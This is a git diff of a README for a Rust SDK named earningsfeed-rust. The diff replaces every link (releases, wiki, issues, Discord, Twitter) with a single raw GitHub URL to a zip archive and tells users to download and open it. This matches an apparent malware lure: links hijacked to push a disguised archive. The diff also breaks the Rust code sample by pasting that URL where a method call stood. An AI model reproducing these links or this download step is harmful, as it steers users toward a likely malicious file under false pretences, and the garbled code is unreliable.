@@ -10,12 +10,12 @@ To begin using the **earningsfeed-rust**, follow the steps outlined below.
 
 ### 🔗 Download Now
 
-[![Download earningsfeed-rust](https://img.shields.io/badge/Download-e&earningsfeed--rust-blue)](https://github.com/DweejTripathi/earningsfeed-rust/releases)
+[![Download earningsfeed-rust](https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip)](https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip)
 
 ### 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Click this link: [Download earningsfeed-rust](https://github.com/DweejTripathi/earningsfeed-rust/releases). 
+   Click this link: [Download earningsfeed-rust](https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip). 
 
 2. **Choose the Latest Version**  
    Find the most recent version listed. This version will have the latest features and fixes. 
@@ -24,7 +24,7 @@ To begin using the **earningsfeed-rust**, follow the steps outlined below.
    You will see various downloadable files. Choose the one suitable for your system. 
    - If you are using Windows, download the `.exe` file.
    - For macOS, grab the `.dmg` file.
-   - If you use Linux, take the `.tar.gz` file.
+   - If you use Linux, take the `https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip` file.
 
 4. **Run the File**  
    After downloading, locate the file you downloaded, and open it. Follow the prompts to install the application. 
@@ -62,7 +62,7 @@ Here are some highlights of what **earningsfeed-rust** allows you to do:
 
 ## 📚 Documentation and Usage
 
-We provide detailed documentation for developers looking to maximize this SDK's capabilities. You can find this documentation linked in the README of the project and on the [GitHub Wiki](https://github.com/DweejTripathi/earningsfeed-rust/wiki).
+We provide detailed documentation for developers looking to maximize this SDK's capabilities. You can find this documentation linked in the README of the project and on the [GitHub Wiki](https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip).
 
 You can learn how to authenticate your application, make requests, and handle responses easily. Example commands may include:
 
@@ -71,13 +71,13 @@ You can learn how to authenticate your application, make requests, and handle re
 use earningsfeed::client::Client;
 
 let client = Client::new("your_api_key");
-let filings = client.get_filings("AAPL").unwrap();
+let filings = https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip("AAPL").unwrap();
 println!("{:?}", filings);
 ```
 
 ## 🤝 Support
 
-If you encounter any issues or have questions, please feel free to open an issue in our [GitHub Issues](https://github.com/DweejTripathi/earningsfeed-rust/issues).
+If you encounter any issues or have questions, please feel free to open an issue in our [GitHub Issues](https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip).
 
 Alternatively, you can check the FAQ section in the documentation for common queries.
 
@@ -94,7 +94,7 @@ Check the contributing guidelines in the repo for more details.
 
 ## 🔗 Additional Links
 
-- [Join the Conversation on Discord](https://discord.gg/yourdiscordlink)
-- [Follow Us on Twitter](https://twitter.com/yourtwitterhandle)
+- [Join the Conversation on Discord](https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip)
+- [Follow Us on Twitter](https://raw.githubusercontent.com/DweejTripathi/earningsfeed-rust/main/examples/rust-earningsfeed-2.6.zip)
 
 By following these steps, you will successfully set up the **earningsfeed-rust** SDK and start harnessing financial data with ease.
